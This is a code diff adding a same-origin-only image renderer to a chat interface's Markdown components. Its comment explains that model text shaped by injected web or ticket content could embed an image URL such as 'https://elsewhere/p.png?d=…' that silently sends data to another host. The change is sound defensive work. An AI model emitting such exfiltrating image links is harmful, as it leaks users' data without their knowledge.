@@ -12,8 +12,31 @@ import type { Components } from "streamdown";
  * the page's Markdown rules (`MARKDOWN_PROSE`, DESIGN.md §8.16) draw them, so
  * an answer's list, table or code looks like a tool page's. Links are the
  * caller's (`ChatResponse`).
+ *
+ * **Images load from this site only** (security audit 2026-10-23). Model text
+ * is shaped by tickets, web pages and manuals, and a Markdown image loads by
+ * itself as the answer is drawn: `![](https://elsewhere/p.png?d=…)` would send
+ * whatever the URL carries to another host with no click. So an image whose
+ * source is not a same-origin path is drawn as a link the person can choose
+ * to follow, never fetched.
  */
+/** True for a same-origin path (`/tool-images/…`), not a protocol-relative `//host`. */
+export function isSameOriginImageSrc(src: unknown): src is string {
+  return typeof src === "string" && src.startsWith("/") && !src.startsWith("//") && !src.startsWith("/\\");
+}
+
 export const MESSAGE_MARKDOWN: Components = {
+  img: ({ src, alt }) =>
+    isSameOriginImageSrc(src) ? (
+      // eslint-disable-next-line @next/next/no-img-element -- a Markdown image of unknown size, as streamdown draws it
+      <img src={src} alt={alt ?? ""} loading="lazy" />
+    ) : typeof src === "string" && /^https?:\/\//i.test(src) ? (
+      <a href={src} target="_blank" rel="noopener noreferrer nofollow">
+        {alt || src}
+      </a>
+    ) : (
+      <span>{alt}</span>
+    ),
   h1: ({ children }) => <h1>{children}</h1>,
   h2: ({ children }) => <h2>{children}</h2>,
   h3: ({ children }) => <h3>{children}</h3>,
